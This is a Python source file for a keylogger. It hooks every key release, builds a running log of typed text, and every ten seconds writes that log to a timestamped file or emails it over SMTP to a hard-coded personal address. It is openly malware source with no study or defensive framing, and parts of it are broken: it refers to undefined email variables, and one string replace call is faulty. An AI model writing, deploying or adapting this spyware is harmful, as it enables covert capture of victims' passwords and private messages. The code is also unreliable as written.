import keyboard
import smtplib
import os
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import environ
env=environ.Env()
environ.Env.read_env()

SEND_REPORT_EVERY=10
EMAIL_HOST=env('EMAIL_HOST')
EMAIL_HOST_USER=env('EMAIL_USER')
EMAIL_HOST_PASSWORD=env('EMAIL_PASSWORD')


class Keylogger:
	def __init__(self,interval,report_method='email'):
		self.interval=interval
		self.report_method=report_method
		self.log=''
		self.start_date=datetime.now()
		self.end_date=datetime.now()
	def callback(self,event):
		name=event.name
		if len(name) > 1:
			if name =="space":
				name=" "
			elif name == "enter":
				name="[ENTER]\n"
			elif name == "decimal":
				name="."
			else:
				name=name.replace("","_")
				name=f"[{name.upper()}]"
		self.log+=name

	def update_filename(self):
		start_date_str=str(self.start_date)[:-7].replace(" ","-").replace(":","")
		end_date_str=str(self.end_date)[:-7].replace(" ","-").replace(":","")
		self.filename=f"keylog-{start_date_str}_{end_date_str}"

	def report_to_file(self):
		with open(f"{self.filename}.txt","w") as f:
			print(self.log,file=f)
		print(f"[+] Saved {self.filename}.txt")

	def prepare_email(self,message):
		msg=MIMEMultipart("alternative")
		msg['From']=EMAIL_USER
		msg['To']='kibebekevin@gmail.com'
		msg['Subject']='Keylogger logs'

		html=f"<p>{message}</p>"
		text_part=MIMEText(message,"plain")
		html_part=MIMEText(html,"html")
		msg.attach(text_part)
		msg.attach(html_part)
		return msg.as_string()

	def sendmail(self,email,password,message,verbose=1):
		server=smtplib.SMTP(host=EMAIL_HOST,port=587)
		server.starttls()
		server.login(email,password)
		server.sendmail(email,email,self.prepare_email(message))
		server.quit()
		if verbose:
			print(f"{datetime.now()}- Sent an email to {email} containing {message}")

	def report(self):
		if self.log:
			self.end_date=datetime.now()
			self.update_filename()
			if self.report_method == 'email':
				self.sendmail(EMAIL_USER,EMAIL_PASSWORD,self.log)
			elif self.report_method == 'file':
				self.report_to_file()
				print(f"{self.filename} - {self.log}")
			self.start_date=datetime.now()
		self.log=""
		timer=Timer(interval=self.interval,function=self.report)
		timer.daemon=True
		timer.start()
	def start(self):
		self.start_date=datetime.now()
		keyboard.on_release(callback=self.callback)
		self.report()
		print(f"[+]:{datetime.now()} - Started keylogger...")
		keyboard.wait()


if __name__ == '__main__':
	keylogger=Keylogger(interval=SEND_REPORT_EVERY,report_method="file")
	keylogger.start()
